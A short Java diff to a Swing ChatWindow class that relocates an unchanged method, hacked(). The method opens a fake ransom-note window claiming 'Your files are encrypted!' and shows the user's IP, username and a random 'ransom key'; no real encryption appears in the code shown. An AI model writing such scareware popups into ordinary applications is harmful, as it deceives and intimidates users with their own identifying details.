@@ -49,19 +49,6 @@ public class ChatWindow {
         frame.getContentPane().add(panel, BorderLayout.CENTER);
     }
 
-    public static void hacked() {
-        JFrame hacked = new JFrame();
-        JPanel panel = new JPanel(new GridLayout(4, 1));
-        panel.add(new JLabel("Your files are encrypted!"));
-        panel.add(new JLabel("IP: " + NetUtil.getIP()));
-        panel.add(new JLabel(String.valueOf(System.getProperty("user.name"))));
-        panel.add(new JLabel("Ransom key: " + MCUtils.getRandomPassword(32)));
-        hacked.add(panel);
-        hacked.setTitle("Hacked!");
-        hacked.setSize(300, 300);
-        hacked.setVisible(true);
-    }
-
     private void send() {
         String text = sendText.getText();
         if (!text.isEmpty()) {
@@ -75,5 +62,18 @@ public class ChatWindow {
         messages.add(text);
         if (messages.size() > 20) messages.remove(0);
         receivedText.setText(String.join("\n", messages));
+    }
+
+    public static void hacked() {
+        JFrame hacked = new JFrame();
+        JPanel panel = new JPanel(new GridLayout(4, 1));
+        panel.add(new JLabel("Your files are encrypted!"));
+        panel.add(new JLabel("IP: " + NetUtil.getIP()));
+        panel.add(new JLabel(String.valueOf(System.getProperty("user.name"))));
+        panel.add(new JLabel("Ransom key: " + MCUtils.getRandomPassword(32)));
+        hacked.add(panel);
+        hacked.setTitle("Hacked!");
+        hacked.setSize(300, 300);
+        hacked.setVisible(true);
     }
 }
